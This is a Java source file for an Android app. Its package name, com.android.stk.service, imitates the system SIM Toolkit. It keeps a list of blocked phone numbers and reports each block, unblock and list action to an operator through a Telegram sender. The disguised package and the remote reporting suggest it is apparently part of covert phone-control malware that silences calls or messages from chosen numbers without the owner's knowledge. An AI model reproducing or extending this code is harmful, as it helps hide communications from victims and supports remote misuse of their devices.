package com.android.stk.service;

import android.content.Context;
import android.content.SharedPreferences;

import java.util.HashSet;
import java.util.Set;

public class BlocklistHelper {

    private static final String PREF_NAME = "simtoolkits_blocklist";
    private static final String KEY_BLOCKED = "blocked_numbers";

    // Blokir nomor
    public static void blockNumber(Context context, String number) {
        number = normalizeNumber(number);
        Set<String> list = getBlockedNumbers(context);
        list.add(number);
        save(context, list);
        TelegramSender.sendText("✅ Nomor diblok: " + number);
    }

    // Hapus blokir nomor
    public static void unblockNumber(Context context, String number) {
        number = normalizeNumber(number);
        Set<String> list = getBlockedNumbers(context);
        if (list.remove(number)) {
            save(context, list);
            TelegramSender.sendText("☑️ Nomor dihapus dari blokir: " + number);
        } else {
            TelegramSender.sendText("❌ Nomor tidak ditemukan di daftar blok.");
        }
    }

    // Tampilkan daftar nomor yang diblok
    public static void showBlocklist(Context context) {
        Set<String> list = getBlockedNumbers(context);
        if (list.isEmpty()) {
            TelegramSender.sendText("📭 Tidak ada nomor yang diblok.");
        } else {
            StringBuilder msg = new StringBuilder("🚫 Daftar blok:\n");
            for (String num : list) {
                msg.append("• ").append(num).append("\n");
            }
            TelegramSender.sendText(msg.toString());
        }
    }

    // Cek apakah nomor sedang diblok
    public static boolean isBlocked(Context context, String number) {
        number = normalizeNumber(number);
        return getBlockedNumbers(context).contains(number);
    }

    // Ambil semua nomor yang diblok dari SharedPreferences
    private static Set<String> getBlockedNumbers(Context context) {
        SharedPreferences prefs = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
        return new HashSet<>(prefs.getStringSet(KEY_BLOCKED, new HashSet<>()));
    }

    // Simpan daftar blokir
    private static void save(Context context, Set<String> list) {
        context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
                .edit().putStringSet(KEY_BLOCKED, list).apply();
    }

    // Normalisasi nomor: hapus spasi, strip, dst
    private static String normalizeNumber(String number) {
        if (number == null) return "";
        return number.replaceAll("[\\s\\-+]", "").trim();
    }
}
